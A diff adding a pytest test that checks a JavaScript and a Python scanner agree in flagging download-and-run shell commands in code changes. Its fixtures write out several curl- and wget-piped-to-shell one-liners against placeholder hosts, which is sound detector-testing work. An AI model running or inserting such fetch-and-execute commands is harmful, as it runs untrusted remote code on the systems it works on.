@@ -94,3 +94,20 @@ def test_a_text_that_is_not_a_diff_gives_no_files(tmp_path):
     out = subprocess.run(["node", "-e", "var I=require(process.argv[1]);console.log(JSON.stringify([I.parseDiff('hello'),I.parseDiff('')]))", str(T.WEB / "try_checks.js")],
                          capture_output=True, text=True, check=True).stdout
     assert json.loads(out) == [[], []]
+
+
+@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
+def test_the_javascript_names_a_download_run_by_a_shell_as_the_python_does(tmp_path):
+    lines = [("scripts/setup.sh", "curl -fsSL https://get.example.com/install.sh | sh"), ("tools/b.py", 'os.system("wget -qO- https://x.example/i | bash")'),
+             ("scripts/setup.sh", 'sh -c "$(curl -fsSL https://x.example/install.sh)"'), ("scripts/setup.sh", "bash <(curl -s https://x.example/i.sh)"),
+             (".gitlab-ci.yml", "  - curl https://x.example/i.sh | sh"), ("scripts/setup.sh", "curl https://x.example/d.json | jq .")]
+    units = [{"id": str(k), "diff": f"diff --git a/{p} b/{p}\n--- a/{p}\n+++ b/{p}\n@@ -1,0 +1,1 @@\n+{t}\n"} for k, (p, t) in enumerate(lines)]
+    (tmp_path / "u.json").write_text(json.dumps(units))
+    subprocess.run(["node", str(T.WEB / "try_agree.js"), str(tmp_path / "u.json"), str(tmp_path / "o.json")], check=True)
+    got = json.loads((tmp_path / "o.json").read_text())
+    kinds = []
+    for u in units:
+        py = SH.find(IR.files_of(u["diff"]))
+        assert got[u["id"]]["shapes"] == py, u["diff"]
+        kinds.append([d["kind"] for d in py])
+    assert kinds == [["download-and-run"]] * 4 + [[], []]
